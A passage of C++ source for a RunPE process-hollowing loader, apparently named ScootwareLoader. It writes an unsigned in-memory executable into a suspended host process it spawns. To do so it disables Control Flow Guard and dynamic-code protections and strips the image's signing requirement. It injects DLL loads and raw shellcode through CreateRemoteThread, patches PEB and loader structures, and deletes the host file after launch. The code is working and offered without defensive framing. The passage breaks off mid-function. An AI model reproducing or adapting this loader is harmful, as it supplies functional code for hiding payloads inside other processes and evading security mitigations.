#include "runpe.h"
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <shlobj.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")

// NTDLL function types
typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

namespace RunPE {

    // Convert an RVA to a raw file offset by walking the section table.
    // Needed because localBuffer holds the raw on-disk PE, not a memory-mapped image.
    static DWORD RvaToOffset(PIMAGE_NT_HEADERS64 pNtHeaders, DWORD rva) {
        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            DWORD va  = pSec[i].VirtualAddress;
            DWORD vsz = pSec[i].Misc.VirtualSize ? pSec[i].Misc.VirtualSize : pSec[i].SizeOfRawData;
            if (rva >= va && rva < va + vsz)
                return pSec[i].PointerToRawData + (rva - va);
        }
        return 0;
    }

    // Convert PE section characteristics to VirtualProtect constants
    static DWORD SectionProtection(DWORD characteristics) {
        DWORD protect = 0;
        bool exec  = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        bool read  = (characteristics & IMAGE_SCN_MEM_READ) != 0;
        bool write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (exec && read && write)       protect = PAGE_EXECUTE_READWRITE;
        else if (exec && read)           protect = PAGE_EXECUTE_READ;
        else if (exec && write)          protect = PAGE_EXECUTE_WRITECOPY;
        else if (exec)                   protect = PAGE_EXECUTE;
        else if (read && write)          protect = PAGE_READWRITE;
        else if (read)                   protect = PAGE_READONLY;
        else if (write)                  protect = PAGE_WRITECOPY;
        else                             protect = PAGE_NOACCESS;

        return protect;
    }

    // Apply base relocations when image loaded at different address than preferred
    static bool ApplyRelocations(
        HANDLE hProcess,
        LPVOID pRemoteImage,
        const uint8_t* localBuffer,
        PIMAGE_NT_HEADERS64 pNtHeaders,
        ULONGLONG delta)
    {
        if (delta == 0) return true; // No relocation needed

        DWORD relocRVA  = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relocSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        if (relocRVA == 0 || relocSize == 0) {
            std::cout << "[-] PE has no relocation table and cannot be rebased\n";
            return false;
        }

        DWORD relocOffset = RvaToOffset(pNtHeaders, relocRVA);
        if (relocOffset == 0) {
            std::cout << "[-] Failed to map reloc RVA to file offset\n";
            return false;
        }
        const uint8_t* relocBase = localBuffer + relocOffset;
        DWORD processed = 0;

        while (processed < relocSize) {
            auto* block = (IMAGE_BASE_RELOCATION*)(relocBase + processed);
            if (block->SizeOfBlock == 0) break;

            DWORD entryCount = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = (WORD*)((uint8_t*)block + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < entryCount; i++) {
                WORD type   = entries[i] >> 12;
                WORD offset = entries[i] & 0x0FFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    // Read the original 8-byte value from remote, add delta, write back
                    ULONGLONG patchAddr = (ULONGLONG)pRemoteImage + block->VirtualAddress + offset;
                    ULONGLONG originalValue = 0;

                    if (!ReadProcessMemory(hProcess, (LPCVOID)patchAddr, &originalValue, sizeof(ULONGLONG), NULL)) {
                        std::cout << "[-] Failed to read reloc at RVA 0x" << std::hex << (block->VirtualAddress + offset) << std::dec << "\n";
                        return false;
                    }

                    originalValue += delta;

                    if (!WriteProcessMemory(hProcess, (LPVOID)patchAddr, &originalValue, sizeof(ULONGLONG), NULL)) {
                        std::cout << "[-] Failed to write reloc at RVA 0x" << std::hex << (block->VirtualAddress + offset) << std::dec << "\n";
                        return false;
                    }
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    // 32-bit relocation (rare in x64 but handle it)
                    ULONGLONG patchAddr = (ULONGLONG)pRemoteImage + block->VirtualAddress + offset;
                    DWORD originalValue = 0;
                    ReadProcessMemory(hProcess, (LPCVOID)patchAddr, &originalValue, sizeof(DWORD), NULL);
                    originalValue += (DWORD)delta;
                    WriteProcessMemory(hProcess, (LPVOID)patchAddr, &originalValue, sizeof(DWORD), NULL);
                }
                // IMAGE_REL_BASED_ABSOLUTE (type 0) = padding, skip
            }

            processed += block->SizeOfBlock;
        }

        return true;
    }

    // Force a DLL to be loaded into the child process by injecting a LoadLibraryA
    // call via CreateRemoteThread. Safe to call before the main thread resumes
    // because CREATE_SUSPENDED only suspends the initial thread; ntdll/heap are ready.
    static void EnsureDllInChild(HANDLE hProcess, const char* dllName) {
        FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        SIZE_T nameLen = strlen(dllName) + 1;
        LPVOID pRemote = VirtualAllocEx(hProcess, NULL, nameLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pRemote) return;
        WriteProcessMemory(hProcess, pRemote, dllName, nameLen, NULL);
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemote, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
        }
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    }

    // Resolve the Import Address Table of the hollowed PE into the child process.
    // System DLLs share the same ASLR base across all processes on the same boot,
    // so addresses resolved in the parent are valid in the child.
    static bool ResolveImports(
        HANDLE hProcess,
        LPVOID pRemoteImage,
        const uint8_t* localBuffer,
        PIMAGE_NT_HEADERS64 pNtHeaders)
    {
        DWORD importRVA  = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        DWORD importSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

        if (importRVA == 0 || importSize == 0) {
            std::cout << "[RunPE] No import directory — skipping IAT fixup\n";
            return true;
        }

        DWORD importOffset = RvaToOffset(pNtHeaders, importRVA);
        if (importOffset == 0) {
            std::cout << "[-] Failed to map import RVA to file offset\n";
            return false;
        }
        auto* pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)(localBuffer + importOffset);

        while (pImportDesc->Name != 0) {
            DWORD nameOffset = RvaToOffset(pNtHeaders, pImportDesc->Name);
            if (nameOffset == 0) {
                std::cout << "[-] IAT: bad DLL name RVA\n";
                return false;
            }
            const char* dllName = (const char*)(localBuffer + nameOffset);

            // Ensure this DLL is mapped in the child before we write its function
            // addresses into the IAT. The child was spawned from ScootwareLoader so
            // it only has ScootwareLoader's imports mapped — payload DLLs like
            // VCRUNTIME140 / api-ms-win-crt-* may be absent.
            EnsureDllInChild(hProcess, dllName);

            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                std::cout << "[-] IAT: failed to load " << dllName << "\n";
                return false;
            }

            // Use OriginalFirstThunk (INT) for name lookup, FirstThunk (IAT) for patching
            DWORD intRva = pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk;
            DWORD intOffset = RvaToOffset(pNtHeaders, intRva);
            if (intOffset == 0) {
                std::cout << "[-] IAT: bad INT RVA for " << dllName << "\n";
                return false;
            }
            auto* pINT = (IMAGE_THUNK_DATA64*)(localBuffer + intOffset);
            ULONGLONG iatRVA = pImportDesc->FirstThunk;

            for (DWORD i = 0; pINT[i].u1.AddressOfData != 0; i++) {
                FARPROC funcAddr = nullptr;

                if (IMAGE_SNAP_BY_ORDINAL64(pINT[i].u1.Ordinal)) {
                    WORD ordinal = (WORD)(pINT[i].u1.Ordinal & 0xFFFF);
                    funcAddr = GetProcAddress(hDll, MAKEINTRESOURCEA(ordinal));
                    if (!funcAddr) {
                        std::cout << "[-] IAT: failed to resolve ordinal " << ordinal << " from " << dllName << "\n";
                        return false;
                    }
                } else {
                    DWORD ibnOffset = RvaToOffset(pNtHeaders, (DWORD)pINT[i].u1.AddressOfData);
                    if (ibnOffset == 0) {
                        std::cout << "[-] IAT: bad IMAGE_IMPORT_BY_NAME RVA\n";
                        return false;
                    }
                    auto* pIBN = (IMAGE_IMPORT_BY_NAME*)(localBuffer + ibnOffset);
                    funcAddr = GetProcAddress(hDll, pIBN->Name);
                    if (!funcAddr) {
                        std::cout << "[-] IAT: failed to resolve " << pIBN->Name << " from " << dllName << "\n";
                        return false;
                    }
                }

                ULONGLONG patchAddr = (ULONGLONG)pRemoteImage + iatRVA + i * sizeof(ULONGLONG);
                ULONGLONG addrValue = (ULONGLONG)funcAddr;
                if (!WriteProcessMemory(hProcess, (LPVOID)patchAddr, &addrValue, sizeof(ULONGLONG), NULL)) {
                    std::cout << "[-] IAT: WriteProcessMemory failed for IAT entry " << i << " in " << dllName << "\n";
                    return false;
                }
            }

            std::cout << "[RunPE] Resolved imports from: " << dllName << "\n";
            pImportDesc++;
        }

        return true;
    }

    bool Execute(const std::vector<uint8_t>& memoryBuffer, size_t allocationSize, const std::string& customHostPath) {
        // Validate PE headers
        if (memoryBuffer.size() < sizeof(IMAGE_DOS_HEADER)) {
            std::cout << "[-] Buffer too small for DOS header\n";
            return false;
        }

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)memoryBuffer.data();
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            std::cout << "[-] Invalid DOS signature\n";
            return false;
        }

        if ((size_t)pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > memoryBuffer.size()) {
            std::cout << "[-] Invalid e_lfanew offset\n";
            return false;
        }

        PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)(memoryBuffer.data() + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
            std::cout << "[-] Invalid NT signature\n";
            return false;
        }

        if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
            std::cout << "[-] Not a 64-bit PE\n";
            return false;
        }

        // scootware.exe is a console-subsystem host so GetStdHandle works natively
        // for any payload. The driver also searches for this exact process name.
        bool payloadIsConsole = (pNtHeaders->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI);

        std::string hostPath;
        if (!customHostPath.empty()) {
            hostPath = customHostPath;
        } else {
            char selfPath[MAX_PATH];
            GetModuleFileNameA(NULL, selfPath, MAX_PATH);
            std::string loaderDir = std::string(selfPath);
            loaderDir = loaderDir.substr(0, loaderDir.find_last_of("\\\\"));
            // Try Release first, then Debug
            hostPath = loaderDir + "\\build\\Release\\scootware.exe";
            DWORD attrib = GetFileAttributesA(hostPath.c_str());
            if (attrib == INVALID_FILE_ATTRIBUTES) {
                hostPath = loaderDir + "\\build\\Debug\\scootware.exe";
                attrib = GetFileAttributesA(hostPath.c_str());
                if (attrib == INVALID_FILE_ATTRIBUTES) {
                    // Fallback to same directory as loader
                    hostPath = loaderDir + "\\scootware.exe";
                }
            }
        }
        std::string commandLine = "\"" + hostPath + "\"";
        std::cout << "[RunPE] Spawning host: " << hostPath << "\n";
        
        // Determine correct working directory for payload
        // Payload expects scripts in %APPDATA%\scootware\scripts
        std::string workingDir;
        char appDataPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            workingDir = std::string(appDataPath) + "\\scootware";
            // Create directory if it doesn't exist
            DWORD attrib = GetFileAttributesA(workingDir.c_str());
            if (attrib == INVALID_FILE_ATTRIBUTES || !(attrib & FILE_ATTRIBUTE_DIRECTORY)) {
                CreateDirectoryA(workingDir.c_str(), NULL);
            }
            std::string scriptsDir = workingDir + "\\scripts";
            attrib = GetFileAttributesA(scriptsDir.c_str());
            if (attrib == INVALID_FILE_ATTRIBUTES || !(attrib & FILE_ATTRIBUTE_DIRECTORY)) {
                CreateDirectoryA(scriptsDir.c_str(), NULL);
            }
            std::cout << "[RunPE] Setting working directory to: " << workingDir << "\n";
        } else {
            // Fallback to loader directory
            workingDir = loaderDir;
            std::cout << "[RunPE] Using loader directory as fallback: " << workingDir << "\n";
        }

        // Create suspended child process with mitigations disabled (CFG causes 0xc0000142 in hollowed processes)
        STARTUPINFOEXA siex = { 0 };
        siex.StartupInfo.cb = sizeof(siex);
        PROCESS_INFORMATION pi = { 0 };

        SIZE_T attrSize = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
        siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
        InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize);

        // Disable CFG and dynamic code restrictions using SDK constants to avoid bit-shift mistakes.
        // CFG causes STATUS_DLL_INIT_FAILED (0xc0000142) in hollowed processes if not disabled.
        DWORD64 policy = 0;
        policy |= PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF;      // 0x0000000200000000
        policy |= PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_OFF;   // 0x0000002000000000

        UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

        // Create pipes for stdout/stderr to capture child's console output
        HANDLE hStdOutRead = NULL, hStdOutWrite = NULL;
        HANDLE hStdErrRead = NULL, hStdErrWrite = NULL;
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        
        // For console payloads, we need a real console for GetStdHandle to work
        // But we can still capture output via pipes if we set up std handles
        DWORD createFlags = CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT;
        if (payloadIsConsole) {
            // Console payload needs a console
            createFlags |= CREATE_NEW_CONSOLE;
            
            // Also set up pipes to capture output
            CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);
            CreatePipe(&hStdErrRead, &hStdErrWrite, &sa, 0);
            SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
            SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0);
            
            siex.StartupInfo.hStdOutput = hStdOutWrite;
            siex.StartupInfo.hStdError = hStdErrWrite;
            siex.StartupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
            siex.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
        } else {
            // GUI payload: no console window
            createFlags |= CREATE_NO_WINDOW;
        }
        
        if (!CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, TRUE, createFlags, NULL, workingDir.c_str(), &siex.StartupInfo, &pi)) {
            std::cout << "[-] CreateProcess failed (Error: " << GetLastError() << ")\n";
            if (hStdOutWrite) CloseHandle(hStdOutWrite);
            if (hStdErrWrite) CloseHandle(hStdErrWrite);
            if (hStdOutRead) CloseHandle(hStdOutRead);
            if (hStdErrRead) CloseHandle(hStdErrRead);
            
            // Fallback: try without extended attributes
            STARTUPINFOA si = { sizeof(si) };
            if (payloadIsConsole) {
                CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);
                CreatePipe(&hStdErrRead, &hStdErrWrite, &sa, 0);
                SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
                SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0);
                
                si.hStdOutput = hStdOutWrite;
                si.hStdError = hStdErrWrite;
                si.dwFlags |= STARTF_USESTDHANDLES;
            }
            
            DWORD fallbackFlags = CREATE_SUSPENDED;
            if (payloadIsConsole) {
                fallbackFlags |= CREATE_NO_WINDOW;
            } else {
                fallbackFlags |= CREATE_NO_WINDOW;
            }
            if (!CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, TRUE, fallbackFlags, NULL, workingDir.c_str(), &si, &pi)) {
                std::cout << "[-] Fallback CreateProcess also failed (Error: " << GetLastError() << ")\n";
                DeleteProcThreadAttributeList(siex.lpAttributeList);
                HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
                return false;
            } else {
                if (!customHostPath.empty()) {
                    DeleteFileA(customHostPath.c_str());
                }
            }
        } else {
            if (!customHostPath.empty()) {
                DeleteFileA(customHostPath.c_str());
            }
        }

        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);

        // Get NtUnmapViewOfSection from ntdll
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        auto NtUnmapViewOfSection = (fnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        auto NtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

        if (!NtUnmapViewOfSection || !NtQueryInformationProcess) {
            std::cout << "[-] Failed to resolve ntdll functions\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Get PEB address via NtQueryInformationProcess
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG retLen = 0;
        NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
        if (status != 0) {
            std::cout << "[-] NtQueryInformationProcess failed (0x" << std::hex << status << std::dec << ")\n";
            // Try alternative: Use NtQueryInformationProcess with different method
            // Or try to get PEB via Wow64Process if applicable
            #ifndef NT_SUCCESS
            #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
            #endif
            if (!NT_SUCCESS(status)) {
                std::cout << "[-] NTSTATUS indicates failure\n";
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }
        }
        std::cout << "[RunPE] PEB base from NtQueryInformationProcess: 0x" << std::hex << (ULONGLONG)pbi.PebBaseAddress << std::dec << "\n";
        
        // Sanity check: PEB should be in a reasonable range (user space)
        // User space addresses on x64 Windows are typically below 0x7FFFFFFFFFFF
        // Kernel addresses are above 0xFFFF800000000000
        if ((ULONGLONG)pbi.PebBaseAddress == 0 || 
            (ULONGLONG)pbi.PebBaseAddress > 0x7FFFFFFFFFFF ||
            ((ULONGLONG)pbi.PebBaseAddress & 0xFFF) != 0) { // Should be page-aligned
            std::cout << "[RunPE] Warning: PEB address seems invalid (0x" << std::hex << (ULONGLONG)pbi.PebBaseAddress << ").\n";
            std::cout << "[RunPE] Trying alternative method via TEB...\n";
            
            // Try to get PEB via TEB - on x64, TEB is in GS segment
            // For a suspended process, we can try to read the TEB from the thread's context
            CONTEXT ctx = {};
            ctx.ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(pi.hThread, &ctx)) {
                // On x64, GS segment base contains TEB
                // But for simplicity, we'll use a different approach
                std::cout << "[RunPE] Thread context obtained, but TEB access is complex\n";
                std::cout << "[RunPE] Will proceed with current PEB address despite suspicion\n";
            } else {
                std::cout << "[RunPE] Failed to get thread context\n";
            }
        }
        
        // Final validation
        if ((ULONGLONG)pbi.PebBaseAddress == 0 || (ULONGLONG)pbi.PebBaseAddress > 0x7FFFFFFFFFFF) {
            std::cout << "[RunPE] ERROR: Still have invalid PEB address. Process may not be properly initialized.\n";
            std::cout << "[RunPE] This is likely why LDR is NULL and exception handling fails.\n";
            // We'll continue anyway, but it will probably fail
        }

        // Read current ImageBaseAddress from PEB
        ULONGLONG originalImageBase = 0;
        // PEB64->ImageBaseAddress is at offset 0x10
        LPVOID pebImageBaseAddr = (LPVOID)((ULONGLONG)pbi.PebBaseAddress + 0x10);
        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(pi.hProcess, pebImageBaseAddr, &originalImageBase, sizeof(ULONGLONG), &bytesRead)) {
            std::cout << "[-] Failed to read ImageBaseAddress from PEB. Error: " << GetLastError() << "\n";
            std::cout << "[RunPE] PEB may not be properly initialized. Trying to continue...\n";
            // Try to get the host's original image base from the PE headers instead
            // Read the host's own headers from its memory
            std::vector<uint8_t> hostHeaders(4096);
            if (ReadProcessMemory(pi.hProcess, (LPCVOID)0x140000000, hostHeaders.data(), 4096, &bytesRead)) {
                PIMAGE_DOS_HEADER pHostDos = (PIMAGE_DOS_HEADER)hostHeaders.data();
                if (pHostDos->e_magic == IMAGE_DOS_SIGNATURE) {
                    PIMAGE_NT_HEADERS64 pHostNt = (PIMAGE_NT_HEADERS64)(hostHeaders.data() + pHostDos->e_lfanew);
                    if (pHostNt->Signature == IMAGE_NT_SIGNATURE) {
                        originalImageBase = pHostNt->OptionalHeader.ImageBase;
                        std::cout << "[RunPE] Got original image base from PE headers: 0x" << std::hex << originalImageBase << std::dec << "\n";
                    }
                }
            }
            if (originalImageBase == 0) {
                originalImageBase = 0x140000000; // Default guess for 64-bit host
                std::cout << "[RunPE] Using default image base: 0x" << std::hex << originalImageBase << std::dec << "\n";
            }
        } else {
            std::cout << "[RunPE] Original image base from PEB: 0x" << std::hex << originalImageBase << std::dec << "\n";
        }

        // Unmap the original image from the child process
        // We leave it mapped so LdrInitializeThunk can initialize the process successfully
        // NtUnmapViewOfSection(pi.hProcess, (PVOID)originalImageBase);

        ULONGLONG preferredBase = pNtHeaders->OptionalHeader.ImageBase;
        size_t imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
        size_t finalSize = (allocationSize > imageSize) ? allocationSize : imageSize;

        // Ensure we allocate enough memory to hold the trampoline at the host's entry point
        PIMAGE_DOS_HEADER pMyDosHdr = (PIMAGE_DOS_HEADER)GetModuleHandleA(NULL);
        PIMAGE_NT_HEADERS64 pMyNtHdr = (PIMAGE_NT_HEADERS64)((BYTE*)pMyDosHdr + pMyDosHdr->e_lfanew);
        size_t minHostSize = pMyNtHdr->OptionalHeader.AddressOfEntryPoint + 32;
        if (finalSize < minHostSize) {
            finalSize = minHostSize;
        }

        // Try to allocate at preferred ImageBase first
        LPVOID pRemoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)preferredBase, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        bool needsRelocation = false;
        if (!pRemoteImage) {
            std::cout << "[*] Preferred base 0x" << std::hex << preferredBase << std::dec << " unavailable, rebasing...\n";
            pRemoteImage = VirtualAllocEx(pi.hProcess, NULL, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            needsRelocation = true;
        }

        if (!pRemoteImage) {
            std::cout << "[-] VirtualAllocEx failed (Error: " << GetLastError() << ")\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        std::cout << "[RunPE] Allocated at 0x" << std::hex << (ULONGLONG)pRemoteImage << std::dec << " (" << finalSize << " bytes)\n";

        // Build a local copy of the headers with flags that cause ntdll to reject
        // unsigned/hollowed images cleared before writing to the child.
        std::vector<uint8_t> headersBuf(memoryBuffer.data(),
                                        memoryBuffer.data() + pNtHeaders->OptionalHeader.SizeOfHeaders);
        auto* pNtHdrPatch = (PIMAGE_NT_HEADERS64)(headersBuf.data() + pDosHeader->e_lfanew);
        // FORCE_INTEGRITY (0x0080): requires image to be signed — our payload is not
        pNtHdrPatch->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY;
        // GUARD_CF (0x4000): CFG flag conflicts with CONTROL_FLOW_GUARD_ALWAYS_OFF process policy
        pNtHdrPatch->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_GUARD_CF;
        // For GUI payloads: force Subsystem=GUI to match the GUI host so ntdll
        // doesn't try to attach a console and fail with 0xC0000142.
        // For CONSOLE payloads: leave subsystem as-is — host is scootware-con.exe
        // (a console app) so the subsystem already matches.
        if (!payloadIsConsole) {
            pNtHdrPatch->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
        }

        // Ensure the SizeOfImage is large enough to encompass the trampoline
        if (pNtHdrPatch->OptionalHeader.SizeOfImage < finalSize) {
            pNtHdrPatch->OptionalHeader.SizeOfImage = (DWORD)finalSize;
        }

        if (!WriteProcessMemory(pi.hProcess, pRemoteImage, headersBuf.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            std::cout << "[-] Failed to write headers\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Write each section
        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            if (pSectionHeader[i].SizeOfRawData == 0) continue; // BSS etc

            LPVOID pDest = (LPVOID)((uintptr_t)pRemoteImage + pSectionHeader[i].VirtualAddress);
            const void* pSrc = memoryBuffer.data() + pSectionHeader[i].PointerToRawData;

            // Bounds check
            if (pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData > memoryBuffer.size()) {
                std::cout << "[-] Section " << pSectionHeader[i].Name << " exceeds buffer\n";
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }

            if (!WriteProcessMemory(pi.hProcess, pDest, pSrc, pSectionHeader[i].SizeOfRawData, NULL)) {
                std::cout << "[-] Failed to write section: " << pSectionHeader[i].Name << "\n";
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }
        }

        // Apply relocations if we couldn't get preferred base
        if (needsRelocation) {
            ULONGLONG delta = (ULONGLONG)pRemoteImage - preferredBase;
            std::cout << "[RunPE] Applying relocations (delta: 0x" << std::hex << delta << std::dec << ")\n";

            if (!ApplyRelocations(pi.hProcess, pRemoteImage, memoryBuffer.data(), pNtHeaders, delta)) {
                std::cout << "[-] Relocation failed\n";
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }
        }

        // Resolve the IAT — must happen after relocations so DLL addresses are final
        // This will trigger EnsureDllInChild -> CreateRemoteThread -> LdrInitializeThunk.
        // Because the original image is still mapped and PEB->ImageBaseAddress points to it,
        // LdrInitializeThunk will successfully initialize the process and create the LDR!
        if (!ResolveImports(pi.hProcess, pRemoteImage, memoryBuffer.data(), pNtHeaders)) {
            std::cout << "[-] IAT resolution failed\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Now that the process is initialized, update PEB->ImageBaseAddress to point to our new image.
        ULONGLONG newBase = (ULONGLONG)pRemoteImage;
        if (!WriteProcessMemory(pi.hProcess, pebImageBaseAddr, &newBase, sizeof(ULONGLONG), NULL)) {
            std::cout << "[-] Failed to patch PEB ImageBaseAddress\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // -----------------------------------------------------------------------
        // Patch the LDR entry SizeOfImage so the OS exception dispatcher's
        // LDR-based lookup covers the full new image range.
        // Without this, RtlLookupFunctionEntry only scans [DllBase, DllBase +
        // old_tiny_host_size) and misses all exception handlers in the payload.
        // -----------------------------------------------------------------------
        {
            // PEB->Ldr is at offset 0x18 in PEB64
            ULONGLONG pebBase     = (ULONGLONG)pbi.PebBaseAddress;
            ULONGLONG pLdrAddr    = pebBase + 0x18;
            ULONGLONG ldrPtr      = 0;
            ReadProcessMemory(pi.hProcess, (LPCVOID)pLdrAddr, &ldrPtr, sizeof(ULONGLONG), NULL);

            // PEB_LDR_DATA->InLoadOrderModuleList.Flink is at offset 0x10
            ULONGLONG listHead = ldrPtr + 0x10; // &InLoadOrderModuleList
            ULONGLONG flink    = 0;
            ReadProcessMemory(pi.hProcess, (LPCVOID)listHead, &flink, sizeof(ULONGLONG), NULL);

            // Debug output
            std::cout << "[RunPE] Debug: PEB @ 0x" << std::hex << pebBase << std::dec << "\n";
            std::cout << "[RunPE] Debug: LDR pointer = 0x" << std::hex << ldrPtr << std::dec << "\n";
            if (ldrPtr == 0) {
                std::cout << "[RunPE] Debug: LDR pointer is NULL - PEB may be corrupted\n";
                // Try to initialize exception chain by calling RtlInitializeExceptionChain in child
                ULONGLONG rtlInitAddr = (ULONGLONG)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitializeExceptionChain");
                if (rtlInitAddr) {
                    uint8_t sc[12] = {
                        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,  // movabs rax, rtlInitAddr (10 bytes)
                        0xFF, 0xD0                            // call rax (2 bytes) - total 12
                    };
                    memcpy(sc + 2, &rtlInitAddr, 8);
                    
                    LPVOID pScMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (pScMem) {
                        WriteProcessMemory(pi.hProcess, pScMem, sc, sizeof(sc), NULL);
                        HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pScMem, NULL, 0, NULL);
                        if (hThread) {
                            WaitForSingleObject(hThread, 2000);
                            CloseHandle(hThread);
                        }
                        VirtualFreeEx(pi.hProcess, pScMem, 0, MEM_RELEASE);
                        std::cout << "[RunPE] Called RtlInitializeExceptionChain in child\n";
                        
                        // Re-read LDR pointer
